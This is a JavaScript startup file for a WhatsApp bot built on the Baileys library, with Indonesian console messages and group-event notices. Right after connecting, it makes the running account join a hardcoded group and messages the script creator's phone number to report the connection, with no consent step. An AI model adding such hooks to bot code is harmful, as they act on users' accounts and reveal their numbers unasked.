var {
    WAConnection,
    MessageType,
    Presence,
    Mimetype,
    GroupSettingChange
} = require('@adiwajshing/baileys')
var fs = require('fs')
var { wait, forks, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, spinner, globalSpinner, banner, start, info, success, close } = require('./V2/functions')
var { color } = require('./V2/color')
var welcome = require('./V5/group')
var chalk = require('chalk')
var colors = require('colors')
var spin = require('spinnies')
var async = require('async')
var CFonts = require('cfonts')
var os = require('os')

require('./V1/base.js')
nocache('./V1/base.js', module => console.log(`${module} Telah Di Update!`))

var starts = async (Kanna = new WAConnection()) => {
                  Kanna.logger.level = 'warn'
                  Kanna.version = [2, 2143, 3]
                  console.log(color('[ YT : Kanna Bot× ]', 'cyan'), color('Owner Is Online Now!!!', 'yellow'))
	              console.log(color('[ YT : Kanna Bot× ]', 'cyan'), color('Welcome Back, Owner! Hope You Are Doing Well~', 'yellow'))
                  Kanna.browserDescription = [ 'Kanna Bot', 'Chrome', '3.0' ]
                  Kanna.on('qr', () => {
                  console.log(color('[','red'), color('!','yellow'), color(']','red'), color('Scan Kak', 'white'))
                  })
                  fs.existsSync(`./V1/session/KannaBot.json`) && Kanna.loadAuthInfo(`./V1/session/KannaBot.json`)
                  Kanna.on('connecting', () => {
		          console.log(color('[ LOADING ]', 'cyan'), color('Loading Bang Sabar Napa.......', 'yellow'));
	              })
                  Kanna.on('open', () => {
		          console.log(color('[ SUCCES ]', 'cyan'), color('Bot Online Pliss Subrek YT : Kanna Bot×', 'yellow'));
	              })
                  await Kanna.connect({
		          timeoutMs: 30 * 1000
	              })
fs.writeFileSync(`./V1/session/KannaBot.json`, JSON.stringify(Kanna.base64EncodedAuthInfo(), null, '\t'))
                                console.log(color('','aqua'), color(`||================================================||`, "red"))
                                console.log(color(' ||> ','yellow'), color(`𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐊𝐚𝐧𝐧𝐚𝐁𝐨𝐭𝐳`, 'magenta'))
                                console.log(color(' ||> ','yellow'), color(`𝐍𝐞𝐰 𝐁𝐚𝐬𝐞 𝐊𝐚𝐧𝐧𝐚𝐁𝐨𝐭𝐳`, 'magenta'))
                                console.log(color(' ||> ','yellow'), color(`𝐒𝐮𝐛𝐫𝐞𝐤 𝐘𝐓 𝐊𝐚𝐧𝐧𝐚 𝐁𝐨𝐭`, 'magenta'))
                                console.log(color(' ||> ','yellow'), color(`𝐉𝐚𝐧𝐠𝐚𝐧 𝐇𝐚𝐩𝐮𝐬 𝐍𝐚𝐦𝐚 𝐆𝐮𝐚 𝐁𝐚𝐧𝐠`, 'magenta'))
                                console.log(color(' ||> ','yellow'), color(`𝐇𝐚𝐫𝐠𝐚𝐢 𝐃𝐨𝐧𝐤 𝐀𝐤𝐮 𝐂𝐚𝐩𝐞`, 'magenta'))
                                console.log(color(' ||> ','yellow'), color(`𝐒𝐞𝐥𝐚𝐦𝐚𝐭 𝐌𝐞𝐧𝐢𝐤𝐦𝐚𝐭𝐢 𝐅𝐢𝐭𝐮𝐫𝐧𝐲𝐚`, 'magenta'))
                                console.log(color('','aqua'), color(`||================================================||`, "red"))
                                teks = `https://chat.whatsapp.com/E4ghRryC8qcD81JnbyBTjj`
                                Kanna.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
                                console.log(color('|WRN|', 'yellow'), color('Join Group Kanna Bot', 'cyan'))
                                Kanna.sendMessage(`62857815632831@s.whatsapp.net`, `Hai Owner 👋\nBot Telah Sukses Tersambung Pada Nomor Ini\n*_SUCCES: ADDED FOR SCRIPT BOT INFO BOT SUDAH DI KIRIM KE CREATOR Kanna_*\n*[TERIMAKASIH]*`, MessageType.extendedText, {sendEphemeral: true, })
                                Kanna.sendMessage(`62857815632831@s.whatsapp.net`, `*---DATABASE BOT---*\n\n•NAMA BOT : Kanna Bot\n•OWNER BOT : Kanna\n•NOMER OWNER : wa.me/62857815632831\n\n*[Bot Sudah TerConnect Ke WhatsApp Kak !! Makasih Kak Kanna Scriptnyaa Moga Berkembang Terus]*`, MessageType.extendedText, {sendEphemeral: true, })
start('2',colors.bold.white('\nMenunggu Pesan Baru..'));


Kanna.on('group-update', async (anu) => {
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'Kanna Botzzシ︎⁩',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Kanna;;;\nFN:Botz\nitem1.TEL;waid=62857815632831:+62 877-0504-8235\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
metdata = await Kanna.groupMetadata(anu.jid)
if(anu.announce == 'false'){
teks = ` [ Group Opened ] \n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
Kanna.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Opened ] - In ${metdata.subject}`)
}
else if(anu.announce == 'true'){
teks = ` [ Group Closed ] \n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
Kanna.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(` [ Group Closed ]  In ${metdata.subject}`)
}
else if(!anu.desc == ''){
tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
teks = ` [ Group Description Change ] \n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
Kanna.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
console.log(`- [ Group Description Change ] - In ${metdata.subject}`)
  }
else if(anu.restrict == 'false'){
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
Kanna.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
  }
else if(anu.restrict == 'true'){
teks = `- [ 𝗚𝗿𝗼𝘂𝗽 𝗦𝗲𝘁𝘁𝗶𝗻𝗴 𝗖𝗵𝗮𝗻𝗴𝗲 ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
Kanna.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
console.log(`- [ Group Setting Change ] - In ${metdata.subject}`)
}
})

Kanna.on('group-participants-update', async (anu) => {
await welcome(Kanna, anu)
})
Kanna.on('chat-update', async (message) => {
require('./V1/base.js')(Kanna, message)
})
}

            function nocache(module, cb = () => { }) {
            console.log('Module', `'${module}'`, 'is now being watched for changes')
            fs.watchFile(require.resolve(module), async () => {
            await uncache(require.resolve(module))
            cb(module)
            })
            }
            function uncache(module = '.') {
            return new Promise((resolve, reject) => {
            try {
            delete require.cache[require.resolve(module)]
            resolve()
            } catch (e) {
            reject(e)
            }
            })
            }
starts()